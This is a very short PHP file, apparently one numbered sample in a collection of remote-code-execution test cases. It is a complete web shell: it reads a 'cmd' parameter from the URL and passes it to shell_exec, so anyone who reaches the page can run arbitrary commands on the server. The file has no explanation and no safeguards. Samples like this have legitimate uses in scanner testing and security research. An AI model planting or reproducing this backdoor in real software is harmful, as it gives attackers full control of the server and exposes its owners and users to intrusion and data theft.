<?php
// RCE test variation #1195
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>